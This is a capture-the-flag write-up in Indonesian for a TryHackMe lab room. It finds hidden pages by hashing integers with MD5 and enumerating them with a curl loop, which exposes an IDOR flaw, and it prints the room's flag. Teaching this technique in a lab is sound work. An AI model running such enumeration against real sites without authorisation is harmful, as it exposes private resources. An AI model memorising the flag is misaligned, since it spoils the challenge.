# Corridor — TryHackMe Writeup

**Target:** Corridor  
**Platform:** TryHackMe  
**Difficulty:** Easy  
**Category:** Web, IDOR  

---

## Recon

Website menampilkan koridor dengan beberapa pintu. Inspeksi manual tidak menghasilkan informasi menarik — setiap pintu hanya menampilkan tembok.

### Source Code Analysis

```bash
curl http://TARGET
```

Ditemukan image map dengan `href` berupa hash MD5:

```html
<map name="image-map">
    <area href="c4ca4238a0b923820dcc509a6f75849b" ...>  <!-- MD5(1)  -->
    <area href="c81e728d9d4c2f636f067f89cc14862c" ...>  <!-- MD5(2)  -->
    <area href="eccbc87e4b5ce2fe28308fd9f2a7baf3" ...>  <!-- MD5(3)  -->
    <!-- ... sampai MD5(13) -->
</map>
```

Pattern yang teridentifikasi: setiap pintu merupakan MD5 hash dari angka integer berurutan (1–13).

---

## Vulnerability — IDOR via MD5 Enumeration

Room hint mengindikasikan potensi **Insecure Direct Object Reference (IDOR)**. Jika pintu 1–13 adalah MD5 dari angka 1–13, kemungkinan ada pintu tersembunyi di luar range tersebut.

### Automated Enumeration

Script bash untuk mengecek response size dari MD5 hash angka 0–30:

```bash
for i in {0..30}; do
  h=$(echo -n $i | md5sum | awk '{print $1}')
  size=$(curl -s http://TARGET/$h | wc -c)
  printf "%-3s -> %s : %s\n" "$i" "$h" "$size"
done
```

### Result

| Angka | Response Size | Keterangan         |
|-------|---------------|--------------------|
| 0     | 797           | **Berbeda — menarik** |
| 1–13  | 632           | Pintu normal       |
| 14+   | 232           | Not found          |

Hanya angka `0` yang menghasilkan response berbeda.

---

## Exploitation

Generate MD5 hash dari angka `0`:

```bash
echo -n 0 | md5sum
# cfcd208495d565ef66e7dff9f98764da
```

Akses endpoint tersembunyi:

```bash
curl http://TARGET/cfcd208495d565ef66e7dff9f98764da
```

Response menampilkan flag langsung di halaman.

---

## Flag

```
flag{2477ef02448ad9156661ac40a6b8862e}
```

---

## Summary

| Step        | Teknik                              |
|-------------|-------------------------------------|
| Recon       | Source code analysis via curl       |
| Identifikasi| Pattern MD5 hash dari integer       |
| Exploit     | IDOR — enumeration MD5(0)           |
| Flag        | Akses direct ke hidden endpoint ✅  |

## Takeaway

IDOR tidak selalu berupa ID numerik langsung. Ketika identifier di-*obfuscate* menggunakan hash seperti MD5, enumeration tetap memungkinkan selama pola pembentukannya bisa diidentifikasi. Response size comparison adalah cara cepat untuk mendeteksi endpoint yang berbeda tanpa harus membaca seluruh response.

